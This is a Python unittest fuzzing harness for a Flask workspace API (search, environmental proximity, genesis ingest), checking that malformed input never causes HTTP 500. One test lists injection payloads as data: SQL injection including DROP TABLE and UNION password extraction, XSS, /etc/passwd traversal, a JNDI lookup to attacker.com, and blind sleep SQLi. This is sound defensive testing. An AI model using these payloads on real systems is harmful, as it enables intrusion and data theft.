#!/usr/bin/env python3
"""
tests/test_adversarial_workspace_api.py
=======================================
Empirical Adversarial Verification & Fuzzing Harness for Workspace Intelligence API.

Stress-tests:
1. /api/workspace/hb-urls/search (Fuzzing, SQLi, XSS, extreme bounds, negative/zero/huge limits, type violations)
2. /api/workspace/environmental/proximity (Poles, out-of-range coords, NaN, invalid types, negative/huge radius)
3. /api/genesis/ingest (Null-safety, empty payloads, type mutations, massive 50KB+ testimonies)
4. /api/workspace/hb-urls/stats & /api/workspace/gis/layers (Burst queries, unexpected params)

Invariant: The server MUST NOT crash with HTTP 500 (Internal Server Error) under any input.
Expected responses are either HTTP 200 (gracefully handled) or HTTP 400 (Bad Request).
"""

import os
import sys
import json
import time
import math
import unittest
from pathlib import Path

os.environ["TESTING"] = "1"

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))
if str(REPO_ROOT / "api") not in sys.path:
    sys.path.insert(0, str(REPO_ROOT / "api"))

from api.main import app


class TestAdversarialWorkspaceAPI(unittest.TestCase):
    """Adversarial stress-testing of workspace intelligence endpoints in api/main.py."""

    @classmethod
    def setUpClass(cls):
        cls.app = app
        cls.app.config["TESTING"] = True
        cls.client = cls.app.test_client()

    # =========================================================================
    # SUITE 1: /api/workspace/hb-urls/search Fuzzing & Stress Testing
    # =========================================================================

    def test_search_empty_queries(self):
        """Test search with empty string and whitespace variants."""
        for q in ["", "   ", "\t", "\n", " \r\n "]:
            with self.subTest(query=repr(q)):
                # GET
                res = self.client.get(f"/api/workspace/hb-urls/search?q={q}")
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on GET with query {repr(q)}")
                self.assertEqual(res.status_code, 200)
                data = res.get_json()
                self.assertEqual(data["status"], "ok")

                # POST
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": q})
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on POST with query {repr(q)}")
                self.assertEqual(res.status_code, 200)

    def test_search_unicode_and_special_characters(self):
        """Test search with complex Unicode, emojis, RTL, and zero-width characters."""
        unicode_cases = [
            "Huntington Beach 🌊🌴",
            "مدينة هنتنغتون بيتش",  # Arabic RTL
            "ハンティントンビーチ",      # Japanese
            "亨廷顿比奇",              # Chinese
            "Hûntïngtön Béäch",       # Accented Latin
            "\u200b\u200c\u200d",     # Zero-width spaces
            "💀🚩🔥⚠️🚨",               # Emojis
            "\uffff\ufeff",           # Byte order marks / non-characters
        ]
        for uc in unicode_cases:
            with self.subTest(case=uc):
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": uc, "limit": 10})
                self.assertNotEqual(res.status_code, 500, f"Server crashed with 500 on Unicode: {repr(uc)}")
                self.assertEqual(res.status_code, 200)
                data = res.get_json()
                self.assertEqual(data["status"], "ok")

    def test_search_sqli_xss_escape_injections(self):
        """Test search with SQL injection, XSS, and command injection strings."""
        attack_strings = [
            "' OR '1'='1",
            "'; DROP TABLE hb_urls; --",
            "1' UNION SELECT null, username, password FROM users--",
            "<script>alert('XSS')</script>",
            "\"><svg onload=alert(1)>",
            "../../../../etc/passwd",
            "${jndi:ldap://attacker.com/a}",
            "{{ 7 * 7 }}",
            "%00%0a%0d",
            "\" or sleep(5)#",
        ]
        for atk in attack_strings:
            with self.subTest(attack=atk):
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": atk, "limit": 5})
                self.assertNotEqual(res.status_code, 500, f"Server crashed with 500 on injection payload: {atk}")
                self.assertEqual(res.status_code, 200)
                data = res.get_json()
                self.assertEqual(data["status"], "ok")

    def test_search_oversized_query_payloads(self):
        """Test search with massive 10KB and 100KB query strings."""
        for size in [10_000, 100_000]:
            with self.subTest(size=size):
                huge_str = "planning " * (size // 9)
                t0 = time.time()
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": huge_str, "limit": 5})
                elapsed = time.time() - t0
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on {size} char query")
                self.assertLess(elapsed, 10.0, f"Query took too long: {elapsed:.2f}s")

    def test_search_limit_bounds_and_extremes(self):
        """Test search with extreme limits: negative, zero, and huge values."""
        extreme_limits = [
            (-100, "Negative limit -100"),
            (-1, "Negative limit -1"),
            (0, "Zero limit 0"),
            (1, "Minimum positive limit 1"),
            (100_000, "Massive limit 100,000"),
            (1_000_000, "Massive limit 1,000,000"),
        ]
        for limit_val, desc in extreme_limits:
            with self.subTest(limit=limit_val, desc=desc):
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": "agenda", "limit": limit_val})
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on {desc}")
                # Server should return 200 or 400, never 500
                self.assertIn(res.status_code, [200, 400])
                if res.status_code == 200:
                    data = res.get_json()
                    self.assertEqual(data["status"], "ok")

    def test_search_offset_extremes(self):
        """Test search with extreme offset values."""
        for offset_val in [-50, -1, 0, 82757, 100_000, 99_999_999]:
            with self.subTest(offset=offset_val):
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": "council", "offset": offset_val, "limit": 10})
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on offset {offset_val}")
                self.assertIn(res.status_code, [200, 400])

    def test_search_nonexistent_and_malformed_categories(self):
        """Test search with non-existent, lowercase, or special categories."""
        cat_cases = [
            "NON_EXISTENT_CATEGORY_9999",
            "council_agendas_minutes",  # Lowercase
            "CoUnCiL_AgEnDaS_MiNuTeS",  # Mixed case
            "ALL",
            "   ",
            "PUBLIC_WORKS_UTILITIES; DROP TABLE",
        ]
        for cat in cat_cases:
            with self.subTest(category=cat):
                res = self.client.post("/api/workspace/hb-urls/search", json={"query": "water", "category": cat})
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on category {repr(cat)}")
                self.assertEqual(res.status_code, 200)
                data = res.get_json()
                self.assertEqual(data["status"], "ok")

    def test_search_invalid_limit_types_get_and_post(self):
        """Adversarial type fuzzing: non-integer limit in GET and POST must not trigger HTTP 500."""
        invalid_limits = ["abc", "invalid", "12.34", "NaN", "null", "undefined"]
        for bad_lim in invalid_limits:
            with self.subTest(bad_limit_get=bad_lim):
                res = self.client.get(f"/api/workspace/hb-urls/search?limit={bad_lim}")
                # A robust server must reject with 400 or sanitize to default, NEVER crash with 500
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] GET /search?limit={bad_lim} crashed with HTTP 500")
                self.assertIn(res.status_code, [200, 400])

            with self.subTest(bad_limit_post=bad_lim):
                res = self.client.post("/api/workspace/hb-urls/search", json={"limit": bad_lim})
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] POST /search with limit={bad_lim} crashed with HTTP 500")
                self.assertIn(res.status_code, [200, 400])

    def test_search_type_mutations_post(self):
        """Adversarial type fuzzing: passing non-string query or category to POST /search."""
        type_mutations = [
            ({"query": 12345}, "query as integer"),
            ({"query": True}, "query as boolean"),
            ({"query": ["list", "of", "words"]}, "query as list"),
            ({"query": {"nested": "obj"}}, "query as dict"),
            ({"category": 12345}, "category as integer"),
            ({"category": ["DOCUMENTS_AND_PDFS"]}, "category as list"),
            ({"limit": {"nested": 10}}, "limit as dict"),
            ({"offset": "not_an_int"}, "offset as string"),
        ]
        for payload, desc in type_mutations:
            with self.subTest(desc=desc):
                res = self.client.post("/api/workspace/hb-urls/search", json=payload)
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] POST /search with {desc} crashed with HTTP 500")
                self.assertIn(res.status_code, [200, 400])

    # =========================================================================
    # SUITE 2: /api/workspace/environmental/proximity Fuzzing & Stress Testing
    # =========================================================================

    def test_proximity_extreme_coordinates_poles_and_beyond(self):
        """Test proximity with North Pole, South Pole, and extreme/out-of-range coordinates."""
        coords = [
            (90.0, 0.0, "North Pole"),
            (-90.0, 0.0, "South Pole"),
            (0.0, 0.0, "Null Island (0,0)"),
            (89.9999, 179.9999, "Near Anti-meridian Pole"),
            (-89.9999, -179.9999, "Antarctic Anti-meridian"),
            (180.0, 360.0, "Beyond Normal Latitude (+180, +360)"),
            (-999999.0, 999999.0, "Massive Out of Range (+-999999)"),
        ]
        for lat, lon, desc in coords:
            with self.subTest(desc=desc):
                res = self.client.post("/api/workspace/environmental/proximity", json={"lat": lat, "lon": lon, "radius_miles": 5.0})
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] Proximity crashed with HTTP 500 at {desc} ({lat}, {lon})")
                self.assertIn(res.status_code, [200, 400])
                if res.status_code == 200:
                    data = res.get_json()
                    self.assertIn("status", data)
                    self.assertIn("nearest_plume", data)

    def test_proximity_antipodal_haversine_math(self):
        """Test Haversine distance with exact antipodal points to ensure no math domain errors (a > 1.0)."""
        # Cameron Lane coordinate
        cam_lat, cam_lon = 33.7064036, -117.9881801
        # Exact antipodal point: -cam_lat, cam_lon + 180 (or - 180)
        anti_lat = -cam_lat
        anti_lon = cam_lon + 180.0 if cam_lon < 0 else cam_lon - 180.0

        res = self.client.post("/api/workspace/environmental/proximity", json={"lat": anti_lat, "lon": anti_lon})
        self.assertNotEqual(res.status_code, 500, "Math domain error or crash on antipodal coordinates")
        self.assertIn(res.status_code, [200, 400])

    def test_proximity_nan_and_string_coordinates(self):
        """Test proximity with NaN, Infinity, and non-numeric string coordinates."""
        bad_coords = [
            {"lat": "invalid", "lon": "corrupt"},
            {"lat": "NaN", "lon": "NaN"},
            {"lat": "Infinity", "lon": "-Infinity"},
            {"lat": None, "lon": None},
            {"lat": "", "lon": ""},
            {"lat": [], "lon": {}},
        ]
        for payload in bad_coords:
            with self.subTest(payload=payload):
                res = self.client.post("/api/workspace/environmental/proximity", json=payload)
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] Proximity crashed with HTTP 500 on {payload}")
                self.assertIn(res.status_code, [200, 400])

    def test_proximity_radius_extremes_and_negative(self):
        """Test proximity with negative, zero, and huge radius values."""
        radius_cases = [
            (-10.0, "Negative radius -10"),
            (-0.0001, "Negative radius -0.0001"),
            (0.0, "Zero radius"),
            (0.00001, "Microscopic radius"),
            (50_000.0, "Radius larger than Earth circumference"),
            (1e9, "Astronomical radius 1e9"),
        ]
        for rad, desc in radius_cases:
            with self.subTest(radius=rad, desc=desc):
                res = self.client.post("/api/workspace/environmental/proximity", json={
                    "lat": 33.7064,
                    "lon": -117.9882,
                    "radius_miles": rad
                })
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] Proximity crashed with HTTP 500 on {desc}")
                self.assertIn(res.status_code, [200, 400])

    def test_proximity_invalid_radius_types(self):
        """Test proximity with invalid radius strings in GET and POST."""
        bad_radii = ["abc", "not_a_number", "NaN", "null"]
        for bad_r in bad_radii:
            with self.subTest(bad_radius_get=bad_r):
                res = self.client.get(f"/api/workspace/environmental/proximity?radius_miles={bad_r}")
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] GET /proximity?radius_miles={bad_r} crashed with HTTP 500")
                self.assertIn(res.status_code, [200, 400])

            with self.subTest(bad_radius_post=bad_r):
                res = self.client.post("/api/workspace/environmental/proximity", json={"radius_miles": bad_r})
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] POST /proximity with radius_miles={bad_r} crashed with HTTP 500")
                self.assertIn(res.status_code, [200, 400])

    def test_proximity_oversized_text_and_address(self):
        """Test proximity with 50KB+ address and testimony text."""
        huge_text = "Displaced from 17642 Beach Blvd due to toxic chemical contamination. " * 800
        res = self.client.post("/api/workspace/environmental/proximity", json={
            "address": "17642 Beach Blvd",
            "text": huge_text,
            "radius_miles": 2.0
        })
        self.assertNotEqual(res.status_code, 500, "Proximity crashed on 50KB text")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data["status"], "FLAGGED")

    # =========================================================================
    # SUITE 3: /api/genesis/ingest Fuzzing & Null-Safety Stress Testing
    # =========================================================================

    def test_genesis_ingest_null_text(self):
        """Test /api/genesis/ingest with {'text': None}."""
        res = self.client.post("/api/genesis/ingest", json={"text": None})
        self.assertNotEqual(res.status_code, 500, "[VULNERABILITY] /api/genesis/ingest with {'text': null} crashed with 500")
        self.assertEqual(res.status_code, 400)
        data = res.get_json()
        self.assertIn("error", data)

    def test_genesis_ingest_empty_payloads(self):
        """Test /api/genesis/ingest with empty dict, empty string, and whitespace."""
        for payload in [{}, {"text": ""}, {"text": "   \n\t  "}]:
            with self.subTest(payload=payload):
                res = self.client.post("/api/genesis/ingest", json=payload)
                self.assertNotEqual(res.status_code, 500, f"HTTP 500 on {payload}")
                self.assertEqual(res.status_code, 400)

    def test_genesis_ingest_non_string_text_types(self):
        """Test /api/genesis/ingest when 'text' is an integer, boolean, list, or dict."""
        mutations = [
            ({"text": 12345}, "integer text"),
            ({"text": True}, "boolean text"),
            ({"text": ["displaced", "tenant"]}, "list text"),
            ({"text": {"victim": "Anthony"}}, "dict text"),
        ]
        for payload, desc in mutations:
            with self.subTest(desc=desc):
                res = self.client.post("/api/genesis/ingest", json=payload)
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] /api/genesis/ingest crashed with 500 on {desc}")
                # Should cleanly reject with 400 or handle with 200
                self.assertIn(res.status_code, [200, 400])

    def test_genesis_ingest_null_and_malformed_wallets(self):
        """Test /api/genesis/ingest with null or malformed wallet addresses."""
        valid_text = "I am a displaced tenant from Woodbridge Apartments reporting hazardous plume exposure."
        wallet_cases = [
            None,
            12345,
            "",
            "0x" + "a" * 40,
            "NOT_A_VALID_WALLET_FORMAT!@#$",
            ["wallet_in_list"],
        ]
        for w in wallet_cases:
            with self.subTest(wallet=w):
                res = self.client.post("/api/genesis/ingest", json={"text": valid_text, "wallet": w})
                self.assertNotEqual(res.status_code, 500, f"[VULNERABILITY] /api/genesis/ingest crashed with 500 on wallet {w}")
                self.assertEqual(res.status_code, 200)
                data = res.get_json()
                self.assertIn("ledger", data)
                self.assertIn("sha256_hash", data["ledger"])
                self.assertEqual(len(data["ledger"]["sha256_hash"]), 64)

    def test_genesis_ingest_large_multiline_testimony(self):
        """Stress-test /api/genesis/ingest with massive 50KB multiline testimony."""
        lines = [f"Paragraph {i}: Eviction without cause at Woodbridge on date 202{i%4}-01-01." for i in range(500)]
        massive_testimony = "\n\n".join(lines)
        self.assertGreater(len(massive_testimony), 25_000)

        t0 = time.time()
        res = self.client.post("/api/genesis/ingest", json={"text": massive_testimony})
        elapsed = time.time() - t0

        self.assertNotEqual(res.status_code, 500, "Crashed with 500 on large multiline testimony")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertIn("ledger", data)
        self.assertEqual(data["ledger"]["status"], "VICTIM")
        self.assertLess(elapsed, 15.0, f"Ingestion took too long: {elapsed:.2f}s")

    # =========================================================================
    # SUITE 4: /api/workspace/hb-urls/stats & /api/workspace/gis/layers
    # =========================================================================

    def test_stats_and_gis_layers_burst(self):
        """Ensure stats and gis/layers endpoints withstand rapid burst queries."""
        for _ in range(25):
            res_stats = self.client.get("/api/workspace/hb-urls/stats")
            self.assertEqual(res_stats.status_code, 200)
            res_gis = self.client.get("/api/workspace/gis/layers")
            self.assertEqual(res_gis.status_code, 200)

    def test_options_preflight_cors(self):
        """Ensure OPTIONS requests return proper CORS headers across all endpoints."""
        endpoints = [
            "/api/workspace/hb-urls/stats",
            "/api/workspace/hb-urls/search",
            "/api/workspace/environmental/proximity",
            "/api/workspace/gis/layers",
            "/api/genesis/ingest",
        ]
        for ep in endpoints:
            with self.subTest(endpoint=ep):
                res = self.client.options(ep)
                self.assertEqual(res.status_code, 200)
                self.assertEqual(res.headers.get("Access-Control-Allow-Origin"), "*")


if __name__ == "__main__":
    unittest.main()
